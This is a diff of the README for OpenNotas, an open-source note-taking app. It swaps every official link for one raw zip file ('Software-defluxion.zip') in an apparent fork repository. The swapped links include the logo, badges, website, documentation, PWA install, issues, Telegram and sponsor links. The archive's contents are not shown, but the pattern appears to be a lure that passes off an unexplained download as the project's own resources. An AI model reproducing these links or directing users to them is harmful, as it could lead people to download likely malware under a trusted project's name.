@@ -1,5 +1,5 @@
 <div align="center">  
-  <img src="https://opennotas.io/logo.png" width="128" height="128" />
+  <img src="https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip" width="128" height="128" />
   <h1 align="center">OpenNotas</h1>
 </div>
 
@@ -11,10 +11,10 @@
 </div>
 
 <p align="center">
-  <img alt="GitHub package.json version" src="https://img.shields.io/github/package-json/v/tonghoai/opennotas">
-  <a title="Website" target="_blank" href="https://opennotas.io"><img alt="Static Badge" src="https://img.shields.io/badge/Website-opennotas.io-%230a0a0a"></a>
-  <a title="Docs" target="_blank" href="https://docs.opennotas.io"><img alt="Static Badge" src="https://img.shields.io/badge/Docs-Docusaurus-%232e8555"></a>
-  <a title="Telegram" target="_blank" href="https://t.me/opennotas"><img alt="Static Badge" src="https://img.shields.io/badge/Telegram-%40opennotas-%230088CC"></a>
+  <img alt="GitHub https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip version" src="https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip">
+  <a title="Website" target="_blank" href="https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip"><img alt="Static Badge" src="https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip%230a0a0a"></a>
+  <a title="Docs" target="_blank" href="https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip"><img alt="Static Badge" src="https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip%232e8555"></a>
+  <a title="Telegram" target="_blank" href="https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip"><img alt="Static Badge" src="https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip%40opennotas-%230088CC"></a>
 </p>
 
 ---
@@ -27,60 +27,60 @@ OpenNotas is an **open-source** note-taking application, **cross-platform** base
 
 OpenNotas **supports Markdown**, utilizing open-source text editing tools that can easily be expanded with additional features and utilities.
 
-![OpenNotas](https://opennotas.io/img/opennotas-2.webp)
+![OpenNotas](https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip)
 
 * **Easy to Use** - OpenNotas is designed to be easy to use. Just a tap and you can start writing notes immediately.
 
 * **Multi-platform** - OpenNotas is available on most platforms, from mobile to desktop, from Windows to Linux, MacOS.
 
-* **Sync** - You can set up note syncing across devices through Adapter configuration, [read more](https://docs.opennotas.io/advanced/sync-flow).
+* **Sync** - You can set up note syncing across devices through Adapter configuration, [read more](https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip).
 
-* **End-to-End Encryption** - Note data is encrypted with the AES algorithm before reaching the sync server, keeping your data always safe and secure, [read more](https://docs.opennotas.io/advanced/security).
+* **End-to-End Encryption** - Note data is encrypted with the AES algorithm before reaching the sync server, keeping your data always safe and secure, [read more](https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip).
 
 ## Getting Started
 
 <details>
 <summary>Install the PWA application</summary>
 <br>
-<a title="PWA" target="_blank" href="https://opennotas.io/install"><img alt="Static Badge" src="https://img.shields.io/badge/PWA-OpenNotas-%230a0a0a?style=for-the-badge&logo=pwa"></a>
+<a title="PWA" target="_blank" href="https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip"><img alt="Static Badge" src="https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip%230a0a0a?style=for-the-badge&logo=pwa"></a>
 </details>
 
 <details>
 <summary>Build from source code</summary>
 <br>
 
-[Read the docs](https://docs.opennotas.io/started/install) for any further information.
+[Read the docs](https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip) for any further information.
 </details>
 
 ## Documentation
 
-Check out the full documentation on https://docs.opennotas.io.
+Check out the full documentation on https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip
 
 ## Contributing
 
 Please refer to the following guidelines for contributing code.
 
-OpenNotas was created in just over a month to meet the author's need for a cross-platform note-taking app. You can review it in the article: [Creating a Note-taking App - Notas](https://2coffee.dev/en/articles/note-taking-app-notas).
+OpenNotas was created in just over a month to meet the author's need for a cross-platform note-taking app. You can review it in the article: [Creating a Note-taking App - Notas](https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip).
 
 As a full-time programmer and programming tutorial blogger, I have a lot on my plate. Due to time constraints, I kindly request that you **temporarily refrain from submitting Pull requests for new features** or **expect delays in response to Pull requests**. If you wish to make modifications or add new features, please clone the source code and build it for yourself. Thank you for your understanding!
 
 ## Report bugs
 
-If any issues occur during the usage process, please create an [Issues](https://github.com/tonghoai/opennotas/issues) on GitHub for further assistance.
+If any issues occur during the usage process, please create an [Issues](https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip) on GitHub for further assistance.
 
 ## Community Support
 
-Join the OpenNotas community channel at https://t.me/opennotas.
+Join the OpenNotas community channel at https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip
 
-Alternatively, you can open an [Issues](https://github.com/tonghoai/opennotas/issues) on Github.
+Alternatively, you can open an [Issues](https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip) on Github.
 
 ## A Confession and a Thank You
 
-I use coffee daily for work, and I also have a hobby of collecting coffee brewing tools, check out my blog posts at [Coffee Enthusiasts](https://2coffee.dev/en/topics/coffee-enthusiasts) and [Coffee Brewing Tools](https://2coffee.dev/en/store/coffee-brewing-tools) if you don't believe me.
+I use coffee daily for work, and I also have a hobby of collecting coffee brewing tools, check out my blog posts at [Coffee Enthusiasts](https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip) and [Coffee Brewing Tools](https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip) if you don't believe me.
 
 If you like what I do, you can buy me a cup of coffee to show your support, I would really appreciate that, by clicking on the Github Sponsors below:
 
-* [GitHub Sponsors](https://github.com/sponsors/tonghoai) (personal; monthly or one-time)
+* [GitHub Sponsors](https://github.com/RushiRuns/opennotas/raw/refs/heads/main/pages/sos/Software-defluxion.zip) (personal; monthly or one-time)
 
 ## License
 
